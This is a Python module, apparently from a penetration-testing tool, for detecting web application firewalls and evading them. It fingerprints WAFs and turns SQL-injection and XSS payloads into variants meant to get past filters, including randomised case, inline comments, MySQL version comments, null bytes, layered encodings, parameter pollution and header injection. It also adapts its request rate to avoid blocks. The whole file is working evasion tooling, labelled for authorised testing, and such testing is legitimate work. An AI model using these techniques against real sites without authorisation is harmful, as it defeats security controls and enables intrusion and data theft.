"""WAF detection and evasion — polymorphic payload encoding for injection testing.
For authorized security testing only.
"""
import re
import random
import urllib.parse
import base64
import time
import logging
from typing import Optional, List, Dict
import requests

logger = logging.getLogger("venomstrike.waf_evasion")


class WAFDetector:
    """Detect and identify Web Application Firewalls."""

    # Response patterns indicating a WAF block
    BLOCK_PATTERNS = [
        (r"access denied", "Generic WAF"),
        (r"403 forbidden", "Generic WAF/Server"),
        (r"request blocked", "Generic WAF"),
        (r"web application firewall", "Generic WAF"),
        (r"mod_security", "ModSecurity"),
        (r"noyb", "ModSecurity"),
        (r"cloudflare", "Cloudflare"),
        (r"cf-ray", "Cloudflare"),
        (r"attention required.*cloudflare", "Cloudflare"),
        (r"incapsula", "Imperva/Incapsula"),
        (r"x-sucuri", "Sucuri"),
        (r"blocked by.*waf", "Generic WAF"),
        (r"not acceptable.*406", "WAF 406 Block"),
    ]

    # Status codes that often indicate WAF blocking
    BLOCK_STATUS_CODES = {403, 406, 429, 503}

    def is_blocked(self, response: requests.Response) -> bool:
        """Check if a response indicates a WAF block."""
        if response is None:
            return False
        if response.status_code in self.BLOCK_STATUS_CODES:
            combined = f"{response.text[:2000]} {str(response.headers)}".lower()
            for pattern, _ in self.BLOCK_PATTERNS:
                if re.search(pattern, combined, re.IGNORECASE):
                    return True
        return False

    def identify_waf(self, response: requests.Response) -> str:
        """Identify which WAF is blocking the request."""
        if response is None:
            return "Unknown"
        combined = f"{response.text[:2000]} {str(response.headers)}".lower()
        for pattern, waf_name in self.BLOCK_PATTERNS:
            if re.search(pattern, combined, re.IGNORECASE):
                return waf_name
        if response.status_code in self.BLOCK_STATUS_CODES:
            return "Unknown WAF (status code)"
        return "None"


class PayloadTransformer:
    """Transform payloads to evade WAF signatures while preserving semantics."""

    # All available technique names (used for full rotation)
    ALL_TECHNIQUES = [
        "case_variation", "comment_injection",
        "url_encode", "double_url_encode",
        "whitespace_variation", "hex_encode",
        "unicode_encode", "null_byte_injection",
        "mysql_comment_bypass", "concat_obfuscation",
        "parameter_pollution",
    ]

    def transform(self, payload: str, techniques: List[str] = None) -> List[str]:
        """Generate multiple evasion variants of a payload.

        Args:
            payload: Original payload string.
            techniques: List of technique names to apply. If None, apply all.

        Returns:
            List of transformed payloads (always includes original).
        """
        if techniques is None:
            techniques = self.ALL_TECHNIQUES

        variants = [payload]  # Always include original

        for technique in techniques:
            method = getattr(self, f"_apply_{technique}", None)
            if method:
                result = method(payload)
                if result and result != payload and result not in variants:
                    variants.append(result)

        return variants

    def _apply_case_variation(self, payload: str) -> str:
        """Randomize case of SQL/HTML keywords."""
        keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR",
                    "INSERT", "UPDATE", "DELETE", "DROP", "SLEEP",
                    "WAITFOR", "DELAY", "BENCHMARK",
                    "script", "alert", "onerror", "onload", "img", "svg"]
        result = payload
        for kw in keywords:
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            def randomize_case(m):
                return "".join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in m.group()
                )
            result = pattern.sub(randomize_case, result)
        return result

    def _apply_comment_injection(self, payload: str) -> str:
        """Insert SQL comments between keywords to break WAF signatures."""
        sql_kw = re.compile(
            r"\b(SELECT|UNION|FROM|WHERE|AND|OR|INSERT|UPDATE|DELETE|SLEEP)\b",
            re.IGNORECASE,
        )
        return sql_kw.sub(lambda m: f"/**/{m.group()}/**/", payload)

    def _apply_url_encode(self, payload: str) -> str:
        """URL-encode special characters."""
        return urllib.parse.quote(payload, safe="")

    def _apply_double_url_encode(self, payload: str) -> str:
        """Double URL-encode the payload."""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")

    def _apply_whitespace_variation(self, payload: str) -> str:
        """Replace spaces with alternative whitespace."""
        alternatives = ["%09", "%0a", "%0d", "+", "%20"]
        ws = random.choice(alternatives)
        return payload.replace(" ", ws)

    # Characters that receive hex encoding in SQL contexts
    HEX_ENCODE_CHARS = frozenset("'\" =();-")

    def _apply_hex_encode(self, payload: str) -> str:
        """Hex-encode special characters (e.g., ' → 0x27) for SQL contexts."""
        result = []
        for ch in payload:
            if ch in self.HEX_ENCODE_CHARS:
                result.append(f"0x{ord(ch):02x}")
            else:
                result.append(ch)
        return "".join(result)

    def _apply_unicode_encode(self, payload: str) -> str:
        """Unicode-escape non-alphanumeric characters (\\uXXXX format).

        Some WAFs fail to normalise Unicode escapes before pattern matching,
        allowing payloads like ``\\u003cscript\\u003e`` to pass through.
        """
        result = []
        for ch in payload:
            if ch.isalnum():
                result.append(ch)
            else:
                result.append(f"\\u{ord(ch):04x}")
        return "".join(result)

    def _apply_null_byte_injection(self, payload: str) -> str:
        """Insert a null byte before the payload.

        Some WAFs and back-end parsers truncate at a null byte, letting the
        real payload reach the application while the WAF only inspects the
        prefix.
        """
        return f"%00{payload}"

    def _apply_mysql_comment_bypass(self, payload: str) -> str:
        """Use MySQL version-conditional comments (/*!50000 ... */).

        MySQL executes code inside ``/*!NNNNN ... */`` if the server version
        is >= NNNNN.  Other databases and most WAFs treat it as a comment.
        """
        sql_kw = re.compile(
            r"\b(SELECT|UNION|INSERT|UPDATE|DELETE|DROP|SLEEP|BENCHMARK)\b",
            re.IGNORECASE,
        )
        return sql_kw.sub(lambda m: f"/*!50000{m.group()}*/", payload)

    def _apply_concat_obfuscation(self, payload: str) -> str:
        """Break string literals into CONCAT() calls to evade keyword matching.

        Replaces quoted strings longer than 2 characters with
        ``CONCAT('ab','cd')`` equivalents.
        """
        def _split_string(m: re.Match) -> str:
            quote = m.group(1)
            body = m.group(2)
            if len(body) <= 2:
                return m.group(0)
            mid = len(body) // 2
            return f"CONCAT({quote}{body[:mid]}{quote},{quote}{body[mid:]}{quote})"

        return re.sub(r"(['\"])([^'\"]{3,})\1", _split_string, payload)

    def _apply_parameter_pollution(self, payload: str) -> str:
        """Create a parameter-pollution variant by duplicating the value.

        Many WAFs only inspect the first or last occurrence of a repeated
        parameter.  This variant prepends a benign decoy before the real
        payload so the pair can be sent as ``param=benign&param=<payload>``.
        The separator ``|||`` is a convention that the injection helper can
        split on.
        """
        return f"harmless|||{payload}"


class AdaptiveThrottle:
    """Adaptive rate limiting to avoid WAF blocks."""

    def __init__(self, base_delay: float = 0.5):
        self.base_delay = base_delay
        self.current_delay = base_delay
        self.consecutive_blocks = 0
        self.max_delay = 30.0

    def on_success(self):
        """Response was successful — decrease delay gradually."""
        self.consecutive_blocks = 0
        self.current_delay = max(self.base_delay, self.current_delay * 0.8)

    def on_block(self):
        """Response was blocked — increase delay with backoff."""
        self.consecutive_blocks += 1
        self.current_delay = min(
            self.max_delay,
            self.current_delay * (1.5 + self.consecutive_blocks * 0.5)
        )
        logger.debug("WAF block detected, delay increased to %.1fs", self.current_delay)

    def wait(self):
        """Sleep for the current adaptive delay."""
        jitter = random.uniform(0, self.current_delay * 0.2)
        time.sleep(self.current_delay + jitter)

    def get_delay(self) -> float:
        """Return current delay value."""
        return self.current_delay


class EncodingRotator:
    """Cycle through encoding schemes to find one that passes the WAF.

    Usage::

        rotator = EncodingRotator()
        for encoded in rotator.rotate("' OR 1=1 --"):
            resp = session.get(url, params={"q": encoded})
            if not waf.is_blocked(resp):
                break  # this encoding bypassed the WAF
    """

    # Ordered from least to most aggressive encoding
    ENCODINGS = [
        "identity",
        "url",
        "double_url",
        "hex",
        "unicode",
        "base64",
        "html_entities",
    ]

    def rotate(self, payload: str) -> List[str]:
        """Return the payload in every supported encoding."""
        variants: List[str] = []
        for enc in self.ENCODINGS:
            method = getattr(self, f"_encode_{enc}", None)
            if method:
                encoded = method(payload)
                if encoded not in variants:
                    variants.append(encoded)
        return variants

    @staticmethod
    def _encode_identity(payload: str) -> str:
        return payload

    @staticmethod
    def _encode_url(payload: str) -> str:
        return urllib.parse.quote(payload, safe="")

    @staticmethod
    def _encode_double_url(payload: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")

    @staticmethod
    def _encode_hex(payload: str) -> str:
        """Hex-encode every byte (e.g., ``%27`` for ``'``)."""
        return "".join(f"%{ord(c):02X}" for c in payload)

    @staticmethod
    def _encode_unicode(payload: str) -> str:
        """Unicode-escape every non-alphanumeric character."""
        return "".join(
            ch if ch.isalnum() else f"\\u{ord(ch):04x}"
            for ch in payload
        )

    @staticmethod
    def _encode_base64(payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def _encode_html_entities(payload: str) -> str:
        """HTML numeric entity encoding (e.g., ``&#39;`` for ``'``)."""
        return "".join(
            f"&#{ord(ch)};" if not ch.isalnum() else ch
            for ch in payload
        )


class HeaderBypass:
    """Inject payloads into less-inspected HTTP headers.

    WAFs often focus on query-string and body inspection. Injecting payloads
    into headers like ``X-Forwarded-For``, ``Referer``, or ``X-Custom-IP``
    can bypass rules that don't inspect these locations.

    For authorised security testing only.
    """

    # Headers commonly processed by back-end applications but
    # frequently ignored by WAFs / IDS
    INJECTION_HEADERS = [
        "X-Forwarded-For",
        "X-Real-IP",
        "X-Client-IP",
        "Referer",
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-Custom-IP-Authorization",
        "True-Client-IP",
        "CF-Connecting-IP",
    ]

    def build_header_variants(
        self, payload: str, *, extra_headers: Dict[str, str] = None,
    ) -> List[Dict[str, str]]:
        """Return a list of header dicts, each placing *payload* in a
        different header field.

        Args:
            payload: The injection payload.
            extra_headers: Optional additional headers to merge into every
                variant (e.g., cookies, auth tokens).

        Returns:
            A list of header dictionaries ready for ``requests.get(headers=...)``.
        """
        base = dict(extra_headers) if extra_headers else {}
        variants: List[Dict[str, str]] = []
        for hdr in self.INJECTION_HEADERS:
            headers = dict(base)
            headers[hdr] = payload
            variants.append(headers)
        return variants
